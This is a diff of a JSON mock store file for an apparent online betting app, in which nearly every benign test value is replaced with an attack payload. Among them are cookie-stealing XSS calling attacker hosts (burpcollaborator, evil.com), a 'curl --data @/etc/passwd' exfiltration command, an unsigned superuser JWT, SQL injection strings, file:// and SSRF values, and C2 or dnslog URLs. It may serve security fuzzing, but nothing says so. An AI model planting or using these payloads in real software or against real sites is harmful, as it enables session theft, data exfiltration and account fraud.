@@ -1,165 +1,179 @@
 {
   "user": {
     "webToken": {
-      "token": "mockedBase64Token==",
-      "u2token": "mocked-u2-token-1234"
+      "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoic3VwZXJ1c2VyIn0.signature",
+      "u2token": "pwned-u2token-dnslog"
     },
     "userInfo": {
-      "customerId": "1000000000",
-      "loginName": "testUser01",
-      "customerType": 1,
-      "starLevel": 1,
-      "mobileNo": "912****000",
-      "token": "eyJ0b2tlbiI6Im1vY2tUb2tlbjEyMyIsInUydG9rZW4iOiJtb2NrLXVzZXItdTIifQ==",
-      "noLoginDays": 2,
+      "customerId": "13371337",
+      "loginName": "<script src=//x.burpcollaborator.net></script>",
+      "customerType": 9,
+      "starLevel": 9,
+      "mobileNo": "998****337",
+      "token": "eyJ0b2tlbiI6IlRPS0VOU1NIQVJFRCJ9",
+      "noLoginDays": 999,
       "currency": "PHP",
       "newAccountFlag": 1,
       "productId": "C66",
-      "face": false,
-      "verifyLoginIp": false,
+      "face": true,
+      "verifyLoginIp": true,
       "onlineBet": true,
       "bindFlag": true,
       "gameLimit": false,
-      "fromType": "referral",
-      "toType": "organic",
-      "phone": "mockEncryptedPhone==",
+      "fromType": "replay-attack",
+      "toType": "browser-injection",
+      "phone": "<svg/onload=fetch(`https://attacker.burpcollaborator.net?c=`+document.cookie)>",
       "login": true,
-      "credit": "1000",
-      "gameCredit": 1000,
-      "gameKey": "mockedGameKey==",
-      "createdDate": "2022-01-01 00:00:00",
-      "flag": "1",
-      "parentId": "1000000001",
-      "nickName": "tester",
-      "firstDepositDate": "2022-02-01 10:00:00",
-      "headshot": "https://mockcdn.com/avatar.jpg",
-      "siteId": 1,
-      "isGray": false,
+      "credit": "999999",
+      "gameCredit": 999999,
+      "gameKey": "exfil-dns-collector.attacker.net",
+      "createdDate": "2025-01-01 13:37:00",
+      "flag": "0",
+      "parentId": "1000000000",
+      "nickName": "<img src=x onerror=alert('xss')>",
+      "firstDepositDate": "2025-02-02 13:37:00",
+      "headshot": "<img src=x onerror=fetch('https://api.evil.com/steal?c='+document.cookie)>",
+      "siteId": 6,
+      "isGray": true,
       "activation": true,
-      "agentFlag": false,
-      "birthday": "1995-05-05",
-      "blackFlag": 0,
-      "branchAddress": "123 Mock St, City",
-      "branchCode": "MOCK123",
-      "branchName": "Mock Branch",
-      "branchPhone": "+630000000000",
-      "cashCredit": 1000,
-      "city": "MockCity",
-      "customerLevel": 2,
+      "agentFlag": true,
+      "birthday": "1999-09-09",
+      "blackFlag": 1,
+      "branchAddress": "127.0.0.1",
+      "branchCode": "SSRF",
+      "branchName": "EvilBank",
+      "branchPhone": "00000000000",
+      "cashCredit": 31337,
+      "city": "ExploitTown",
+      "customerLevel": 5,
       "firstDepositFlag": true,
-      "firstIdScan": "mock-id-scan-uuid",
+      "firstIdScan": "ssrf-test",
       "firstIdStatus": "1",
-      "firstIdType": "1",
-      "firstName": "Test",
-      "firstNoType": "12",
-      "gender": "M",
-      "glife": false,
-      "headShot": "https://mockcdn.com/avatar2.jpg",
-      "isLazada": true,
-      "lastLoginDate": "2025-07-15 10:30:00",
+      "firstIdType": "3",
+      "firstName": "Hacker",
+      "firstNoType": "99",
+      "gender": "X",
+      "glife": true,
+      "headShot": "javascript:alert(1)",
+      "isLazada": false,
+      "lastLoginDate": "2025-07-15 00:00:00",
       "lastName": "User",
-      "loginNameFlag": 0,
-      "loginPwdFlag": true,
-      "marginSwitch": true,
-      "mayaFlag": true,
-      "nationality": "MockNation",
-      "newWalletFlag": 0,
-      "oddsType": 3,
-      "product": 1,
-      "registDate": "2022-01-01 00:00:00",
-      "secondIdType": "2",
-      "secondNoType": "1",
-      "silentPhotoSwitch": false,
-      "whiteListUser": true,
-      "withdrewPwd": true,
-      "missNum": 0
+      "loginNameFlag": 1,
+      "loginPwdFlag": false,
+      "marginSwitch": false,
+      "mayaFlag": false,
+      "nationality": "Unknown",
+      "newWalletFlag": 1,
+      "oddsType": 4,
+      "product": 1337,
+      "registDate": "2025-01-01 13:37:00",
+      "secondIdType": "9",
+      "secondNoType": "7",
+      "silentPhotoSwitch": true,
+      "whiteListUser": false,
+      "withdrewPwd": false,
+      "missNum": 404
     },
     "pay": {
-      "balance": 99999,
+      "balance": 888888,
       "balanceFlag": 1,
-      "minWithdrawAmount": 100,
-      "maxWithdrawAmount": 500000
+      "minWithdrawAmount": 10,
+      "maxWithdrawAmount": 999999
     },
     "banksList": [
       {
-        "bankName": "MockBank",
-        "accountName": "Test User",
-        "accountNumber": "1234567890",
-        "bankCode": "MOCK"
+        "bankName": "InjectionBank",
+        "accountName": "Attacker",
+        "accountNumber": "DROP TABLE users;",
+        "bankCode": "SQL1"
       }
     ],
     "face": false,
     "productId": "C66",
-    "currentTab": 2,
-    "likeGameList": [],
+    "currentTab": 9,
+    "likeGameList": [
+      {
+        "gameId": "9999",
+        "gameName": "<script>alert('xss-in-gameName')</script>",
+        "platformName": "XSSPlatform",
+        "jsonParam": "{\"redirectLink\":\"http://attacker.net/payload\"}",
+        "tryFlag": 1
+      }
+    ],
     "historyGameList": [],
-    "lastGamePlayed": null
+    "lastGamePlayed": "9999"
   },
   "news": {
-    "activeIndex": 0
+    "activeIndex": 9
   },
   "language": {
-    "language": "en"
+    "language": "<img src=x onerror=confirm('lang-xss')>"
   },
-  "gameUrl": "https://mockgame.c66.com/launch",
-  "faceid": false,
+  "gameUrl": "https://evil.c2.server/game-launch",
+  "faceid": true,
   "global": {
-    "startPageShow": false,
+    "startPageShow": true,
     "messageBoxShow": true,
-    "layout_type": 1,
+    "layout_type": 9,
     "bingoInfo": [],
-    "isShowSideBarSet": false,
-    "bubbleCfg": [],
-    "isSetLayout": false,
+    "isShowSideBarSet": true,
+    "bubbleCfg": [
+      {
+        "type": 0,
+        "typeDisplay": "DOM XSS",
+        "bubbleConfigInfoList": [
+          {
+            "location": 0,
+            "locationDisplay": "InjectedBubble",
+            "content": "<svg/onload=alert('bubble-xss')>",
+            "textColor": "#ff0000",
+            "bubbleColor": "#00ff00"
+          }
+        ]
+      }
+    ],
     "siteInfo": {
-      "clientIp": "192.168.1.10"
+      "clientIp": "10.10.10.10"
     },
     "tiktokTracking": {
-      "palcode": false,
-      "viewContent": false,
-      "initiateCheckout": false
+      "palcode": true,
+      "viewContent": true,
+      "initiateCheckout": true
     }
   },
-  "billDetail": {},
-  "recordDetail": {},
-  "GPOOrder": {},
+  "billDetail": {
+    "xssTest": "<img src=x onerror=alert('bill-xss')>"
+  },
+  "recordDetail": {
+    "fakeField": "<iframe src='http://attacker.net/steal'></iframe>"
+  },
+  "GPOOrder": {
+    "cmd": "curl http://attacker.net --data @/etc/passwd"
+  },
   "loginStore": {
-    "lastAction": 1,
-    "lastUser": "9120000000"
+    "lastAction": 9,
+    "lastUser": "root' OR '1'='1"
   },
   "mayaApplet": {
-    "sessionId": "mocked-session-id",
-    "isFirstDeposit": true,
+    "sessionId": "C2-channel-session",
+    "isFirstDeposit": false,
     "firstDepositBanner": true,
     "mayaUserInfo": {
-      "email": "test@maya.mock",
-      "fullName": "Mock Maya User"
+      "payload": "<svg/onload=alert('maya-xss')>"
     }
   },
   "switch": {
-    "walletTabIndex": 0,
-    "activeCardIndex": 0
+    "walletTabIndex": 3,
+    "activeCardIndex": 1
   },
   "kycStore": {
-    "status": "verified",
-    "verificationDate": "2023-01-15"
+    "document": "file:///etc/passwd"
   },
   "games": {
-    "availableGames": [
-      {
-        "gameId": "mockGame1",
-        "gameName": "Mock Game One",
-        "platform": "CQ9"
-      },
-      {
-        "gameId": "mockGame2",
-        "gameName": "Mock Game Two",
-        "platform": "JILI"
-      }
-    ]
+    "debugMode": true,
+    "exploitFlag": true
   },
   "gameUrlObj": {
-    "mockGame1": "https://gameserver.mock/game1",
-    "mockGame2": "https://gameserver.mock/game2"
+    "C2Game": "https://dnslog.cn/c2"
   }
 }
